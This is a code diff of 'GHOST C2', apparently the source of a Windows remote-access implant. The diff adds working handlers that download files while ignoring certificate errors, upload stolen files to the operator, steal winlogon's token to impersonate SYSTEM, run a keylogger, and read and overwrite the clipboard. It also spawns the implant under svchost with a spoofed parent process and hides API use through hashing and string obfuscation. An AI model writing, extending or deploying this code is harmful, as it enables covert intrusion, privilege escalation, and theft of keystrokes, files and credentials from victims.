@@ -1,9 +1,10 @@
-// c2.cpp — GHOST C2 (all features, no unused globals, full Telegram poller)
+// c2.cpp — GHOST C2 beacon loop and command dispatcher
 #include "c2.hpp"
 #include "config.hpp"
 #include "utils.hpp"
 #include "evasion.hpp"
 #include "injection.hpp"
+#include "keylog.hpp"
 #include "obfuscate.hpp"
 #include <windows.h>
 #include <winhttp.h>
@@ -41,6 +42,8 @@ namespace config {
 
 static std::wstring g_SessionId;
 static std::vector<BYTE> g_SessionKey;
+static HANDLE g_StolenToken    = NULL;  // primary token from steal_token
+static DWORD  g_BeaconOverride = 0;    // seconds; 0 = use config defaults
 
 // Derive 32-byte key as SHA-256(sessionId) — must match worker's deriveKey(sid)
 static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
@@ -281,6 +284,93 @@ static HttpResponse WinHttpRequest(
 }
 
 // =====================================================================
+//  GENERIC HTTP/HTTPS GET (for download command — no beacon token header)
+// =====================================================================
+static HttpResponse WinHttpDownload(const std::wstring& url) {
+    HttpResponse resp;
+    static HMODULE hW = []() -> HMODULE {
+        HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
+        return m ? m : LoadLibraryA(XS("winhttp.dll"));
+    }();
+    if (!hW) return resp;
+
+    auto _CrackUrl    = HASHPROC(hW, WinHttpCrackUrl);
+    auto _Open        = HASHPROC(hW, WinHttpOpen);
+    auto _Connect     = HASHPROC(hW, WinHttpConnect);
+    auto _OpenRequest = HASHPROC(hW, WinHttpOpenRequest);
+    auto _SetOption   = HASHPROC(hW, WinHttpSetOption);
+    auto _SendRequest = HASHPROC(hW, WinHttpSendRequest);
+    auto _ReceiveResp = HASHPROC(hW, WinHttpReceiveResponse);
+    auto _QueryAvail  = HASHPROC(hW, WinHttpQueryDataAvailable);
+    auto _ReadData    = HASHPROC(hW, WinHttpReadData);
+    auto _Close       = HASHPROC(hW, WinHttpCloseHandle);
+
+    if (!_CrackUrl || !_Open || !_Connect || !_OpenRequest || !_Close) return resp;
+
+    wchar_t host[512] = {}, path[2048] = {};
+    URL_COMPONENTS uc = {};
+    uc.dwStructSize    = sizeof(uc);
+    uc.lpszHostName    = host; uc.dwHostNameLength = 512;
+    uc.lpszUrlPath     = path; uc.dwUrlPathLength  = 2048;
+    if (!_CrackUrl(url.c_str(), 0, 0, &uc)) return resp;
+
+    bool secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
+    HINTERNET hSes = _Open(config::GetUserAgent(),
+                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSes) return resp;
+
+    DWORD timeout = 45000;
+    if (_SetOption) {
+        _SetOption(hSes, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
+        _SetOption(hSes, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
+    }
+
+    HINTERNET hCon = _Connect(hSes, host, uc.nPort, 0);
+    if (!hCon) { _Close(hSes); return resp; }
+
+    HINTERNET hReq = _OpenRequest(hCon, L"GET", path, nullptr,
+                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                  secure ? WINHTTP_FLAG_SECURE : 0);
+    if (!hReq) { _Close(hCon); _Close(hSes); return resp; }
+
+    if (secure && _SetOption) {
+        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        _SetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+    }
+
+    if (!_SendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+        !_ReceiveResp(hReq, nullptr)) {
+        _Close(hReq); _Close(hCon); _Close(hSes);
+        return resp;
+    }
+
+    DWORD statusSz = sizeof(resp.status);
+    auto _QueryHdrs = HASHPROC(hW, WinHttpQueryHeaders);
+    if (_QueryHdrs)
+        _QueryHdrs(hReq,
+                   WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                   WINHTTP_HEADER_NAME_BY_INDEX,
+                   &resp.status, &statusSz, WINHTTP_NO_HEADER_INDEX);
+
+    DWORD avail = 0;
+    while (_QueryAvail && _QueryAvail(hReq, &avail) && avail > 0) {
+        std::vector<char> buf(avail);
+        DWORD rd = 0;
+        if (_ReadData && _ReadData(hReq, buf.data(), avail, &rd) && rd > 0)
+            resp.body.append(buf.data(), rd);
+        if (resp.body.size() > 64u * 1024 * 1024) break; // 64 MB cap
+    }
+
+    _Close(hReq); _Close(hCon); _Close(hSes);
+    return resp;
+}
+
+// =====================================================================
 //  C2 HOST
 // =====================================================================
 static std::wstring GetC2Host() {
@@ -403,22 +493,32 @@ static std::wstring RunFilelessPS(const std::string& b64Command) {
 }
 
 // =====================================================================
-//  WALLPAPER
+//  CLIPBOARD — read or write system clipboard
 // =====================================================================
-static std::wstring HandleWallpaper(const std::string& args) {
-    if (args.empty() || args == "reset") {
-        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, NULL, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-        return L"[+] Wallpaper reset to default.";
+static std::wstring HandleClipboard(const std::string& args) {
+    if (args.empty()) {
+        // Read clipboard
+        if (!OpenClipboard(nullptr)) return L"[error: OpenClipboard]";
+        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+        if (!hData) { CloseClipboard(); return L"[clipboard: empty or non-text]"; }
+        auto* p = static_cast<wchar_t*>(GlobalLock(hData));
+        std::wstring out = p ? std::wstring(p) : L"[clipboard: lock failed]";
+        GlobalUnlock(hData);
+        CloseClipboard();
+        return out;
     }
-    std::wstring wPath = UTF8ToWString(args);
-    if (GetFileAttributesW(wPath.c_str()) == INVALID_FILE_ATTRIBUTES)
-        return L"[error: file not found]";
-    if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wPath.c_str(),
-                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
-        return L"[+] Wallpaper changed to: " + wPath;
-    }
-    DWORD err = GetLastError();
-    return L"[error: failed to set wallpaper (code=" + std::to_wstring(err) + L")";
+    // Write to clipboard
+    std::wstring wText = UTF8ToWString(args);
+    SIZE_T bytes = (wText.size() + 1) * sizeof(wchar_t);
+    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, bytes);
+    if (!hMem) return L"[error: GlobalAlloc]";
+    memcpy(GlobalLock(hMem), wText.c_str(), bytes);
+    GlobalUnlock(hMem);
+    if (!OpenClipboard(nullptr)) { GlobalFree(hMem); return L"[error: OpenClipboard]"; }
+    EmptyClipboard();
+    SetClipboardData(CF_UNICODETEXT, hMem);
+    CloseClipboard();
+    return L"[+] Clipboard set (" + std::to_wstring(wText.size()) + L" chars)";
 }
 
 // =====================================================================
@@ -494,28 +594,37 @@ static std::wstring HandleBrowser(const std::string& /*args*/) {
 // =====================================================================
 //  STUB HANDLERS
 // =====================================================================
-static std::wstring HandleMigrate(const std::string& args) {
-    DWORD targetPid = args.empty() ? FindBestSvchost() : static_cast<DWORD>(atol(args.c_str()));
-    if (!targetPid) return L"[error: no target pid]";
+// Set to non-zero to signal BeaconLoop to exit cleanly after migrate.
+static volatile DWORD g_MigrateExit = 0;
 
-    // Inject current image into target and exit
+static std::wstring HandleMigrate(const std::string& args) {
+    DWORD svchostPid = args.empty() ? FindBestSvchost()
+                                    : static_cast<DWORD>(atol(args.c_str()));
+    if (!svchostPid) return L"[error: no svchost pid found]";
+
     wchar_t selfPath[MAX_PATH] = {};
     GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
 
-    HANDLE hFile = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ,
-                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hFile == INVALID_HANDLE_VALUE) return L"[error: cannot open self]";
-    LARGE_INTEGER fsz = {};
-    GetFileSizeEx(hFile, &fsz);
-    std::vector<BYTE> payload(static_cast<size_t>(fsz.QuadPart));
-    DWORD rd = 0;
-    ReadFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &rd, nullptr);
-    CloseHandle(hFile);
-    if (rd != payload.size()) return L"[error: read failed]";
+    // Set sentinel so the child skips TryRespawnUnderSvchost and also
+    // skips the mutex check (we'll release it when WinMain exits after 0xDEAD).
+    SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
+    HANDLE hChild = nullptr, hThread = nullptr;
+    if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
+        SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
+        return L"[error: SpawnWithPPID failed (pid=" + std::to_wstring(svchostPid) + L")]";
+    }
+    SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
 
-    BOOL ok = InjectRemoteProcess(targetPid, payload.data(), payload.size(), nullptr);
-    if (!ok) return L"[error: injection failed into pid=" + std::to_wstring(targetPid) + L"]";
-    return L"[+] Migrated into pid=" + std::to_wstring(targetPid);
+    ResumeThread(hThread);
+    DWORD childPid = GetProcessId(hChild);
+    CloseHandle(hThread);
+    CloseHandle(hChild);
+
+    // Signal beacon loop to exit — WinMain exits → mutex released → child acquires it.
+    g_MigrateExit = 1;
+
+    return L"[+] Migrated → svchost pid=" + std::to_wstring(svchostPid)
+         + L" child pid=" + std::to_wstring(childPid) + L" (this instance exiting)";
 }
 
 static std::wstring HandleInject(const std::string& args) {
@@ -607,8 +716,105 @@ static std::wstring HandleWipe(const std::string& /*args*/) {
 }
 static std::wstring HandleLateral(const std::string& /*args*/) { return L"[lateral: not implemented]"; }
 static std::wstring HandleCreds(const std::string& /*args*/)   { return L"[creds: not implemented]"; }
-static std::wstring HandleDownload(const std::string& /*args*/) { return L"[download: not implemented]"; }
-static std::wstring HandleUpload(const std::string& /*args*/)  { return L"[upload: not implemented]"; }
+static std::wstring HandleDownload(const std::string& args) {
+    size_t sp = args.find(' ');
+    if (sp == std::string::npos) return L"Usage: download <url> <dest>";
+    std::string url  = args.substr(0, sp);
+    std::string dest = args.substr(sp + 1);
+    while (!dest.empty() && dest.front() == ' ') dest.erase(0, 1);
+    if (url.empty() || dest.empty()) return L"Usage: download <url> <dest>";
+
+    HttpResponse r = WinHttpDownload(UTF8ToWString(url));
+    if (r.status == 0) return L"[error: request failed]";
+    if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";
+
+    std::wstring wDest = UTF8ToWString(dest);
+    HANDLE hf = CreateFileW(wDest.c_str(), GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE)
+        return L"[error: cannot write " + wDest + L"]";
+    DWORD wr = 0;
+    WriteFile(hf, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr);
+    CloseHandle(hf);
+    return L"[+] Downloaded " + std::to_wstring(wr) + L" bytes → " + wDest;
+}
+
+static std::wstring HandleUpload(const std::string& args) {
+    if (args.empty()) return L"Usage: upload <path>";
+    std::wstring wPath = UTF8ToWString(args);
+    HANDLE hf = CreateFileW(wPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+                            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE) return L"[error: cannot open " + wPath + L"]";
+    LARGE_INTEGER fsz = {};
+    GetFileSizeEx(hf, &fsz);
+    if (fsz.QuadPart > 10 * 1024 * 1024) { CloseHandle(hf); return L"[error: file > 10 MB]"; }
+    std::vector<BYTE> buf(static_cast<size_t>(fsz.QuadPart));
+    DWORD rd = 0;
+    ReadFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
+    CloseHandle(hf);
+    std::string b64 = Base64Encode(buf.data(), rd);
+    // filename from path
+    size_t sl = args.find_last_of("/\\");
+    std::string fname = (sl == std::string::npos) ? args : args.substr(sl + 1);
+    return L"[UPLOAD:" + UTF8ToWString(fname) + L"]\n" + UTF8ToWString(b64);
+}
+
+static std::wstring HandleStealToken(const std::string& /*args*/) {
+    // Find winlogon.exe and duplicate its token
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot]";
+    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
+    DWORD winlogonPid = 0;
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
+                winlogonPid = pe.th32ProcessID; break;
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+    if (!winlogonPid) return L"[error: winlogon.exe not found]";
+
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
+    if (!hProc) return L"[error: OpenProcess pid=" + std::to_wstring(winlogonPid)
+                       + L" err=" + std::to_wstring(GetLastError()) + L"]";
+    HANDLE hTok = nullptr;
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
+        CloseHandle(hProc);
+        return L"[error: OpenProcessToken err=" + std::to_wstring(GetLastError()) + L"]";
+    }
+    CloseHandle(hProc);
+
+    HANDLE hDup = nullptr;
+    BOOL ok = DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
+                               SecurityImpersonation, TokenPrimary, &hDup);
+    CloseHandle(hTok);
+    if (!ok) return L"[error: DuplicateTokenEx err=" + std::to_wstring(GetLastError()) + L"]";
+
+    if (g_StolenToken) CloseHandle(g_StolenToken);
+    g_StolenToken = hDup;
+    ImpersonateLoggedOnUser(g_StolenToken);
+    return L"[+] Token stolen from winlogon.exe (pid=" + std::to_wstring(winlogonPid) + L"), impersonating SYSTEM";
+}
+
+static std::wstring HandleSleepCmd(const std::string& args) {
+    if (args.empty()) return L"Usage: sleep <seconds>";
+    int secs = atoi(args.c_str());
+    if (secs < 1) return L"[error: seconds must be >= 1]";
+    g_BeaconOverride = static_cast<DWORD>(secs);
+    return L"[+] Beacon interval set to " + std::to_wstring(secs) + L"s";
+}
+
+static std::wstring HandleKeylogStart(const std::string& /*args*/) {
+    if (KeylogRunning()) return L"[keylog: already running]";
+    KeylogStart();
+    return KeylogRunning() ? L"[+] Keylogger started" : L"[error: failed to install hook]";
+}
+
+static std::wstring HandleKeylogDump(const std::string& /*args*/) {
+    if (!KeylogRunning()) return L"[keylog: not running — use keylog_start first]";
+    return KeylogDump();
+}
 
 // =====================================================================
 //  COMMAND TABLE
@@ -620,23 +826,28 @@ struct CmdEntry {
 };
 
 static const CmdEntry kCmdTable[] = {
-    { "!ps ",         false, HandlePs },
-    { "!lol ",        false, HandleLol },
-    { "!inject-apc ", false, HandleInjectApc },
-    { "!inject ",     false, HandleInject },
-    { "!migrate ",    false, HandleMigrate },
-    { "!exfil ",      false, HandleExfil },
-    { "!wipe",        false, HandleWipe },
-    { "!lateral ",    false, HandleLateral },
-    { "!creds",       true,  HandleCreds },
-    { "ps",           true,  HandlePs },
-    { "download ",    false, HandleDownload },
-    { "upload ",      false, HandleUpload },
-    { "!wallpaper ",  false, HandleWallpaper },
-    { "!reverse ",    false, HandleReverse },
-    { "!browser",     false, HandleBrowser },
-    { "exit",         true,  nullptr },
-    { "sleep",        true,  nullptr }
+    { "!ps ",          false, HandlePs },
+    { "!lol ",         false, HandleLol },
+    { "!inject-apc ",  false, HandleInjectApc },
+    { "!inject ",      false, HandleInject },
+    { "!migrate ",     false, HandleMigrate },
+    { "!exfil ",       false, HandleExfil },
+    { "!wipe",         false, HandleWipe },
+    { "!lateral ",     false, HandleLateral },
+    { "!creds",        true,  HandleCreds },
+    { "ps",            true,  HandlePs },
+    { "download ",     false, HandleDownload },
+    { "upload ",       false, HandleUpload },
+    { "steal_token",   true,  HandleStealToken },
+    { "keylog_start",  true,  HandleKeylogStart },
+    { "keylog_dump",   true,  HandleKeylogDump },
+    { "sleep ",        false, HandleSleepCmd },
+    { "!clipboard",    true,  HandleClipboard },
+    { "!clipboard ",   false, HandleClipboard },
+    { "!reverse ",     false, HandleReverse },
+    { "!browser",      false, HandleBrowser },
+    { "exit",          true,  nullptr },
+    { "sleep",         true,  nullptr }
 };
 
 // =====================================================================
@@ -756,6 +967,12 @@ DWORD BeaconLoop(const Session& session) {
                 DebugLog(L"Hello sent");
             }
 
+            // Migrate triggered — exit so mutex releases and child can take over
+            if (g_MigrateExit) {
+                SendResult(session.sessionId, L"[ghost] migration complete, exiting");
+                return 0xDEAD;
+            }
+
             // Execute task
             if (!task.empty() && task != L"sleep") {
                 if (task == L"exit") {
@@ -774,7 +991,10 @@ DWORD BeaconLoop(const Session& session) {
 
             // Idle — release wake lock and sleep until next poll
             ReleaseWakeLock();
-            JitterSleep(config::BEACON_MIN, config::BEACON_MAX);
+            if (g_BeaconOverride > 0)
+                JitterSleep(g_BeaconOverride, g_BeaconOverride);
+            else
+                JitterSleep(config::BEACON_MIN, config::BEACON_MAX);
 
         } catch (const std::exception& e) {
             DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
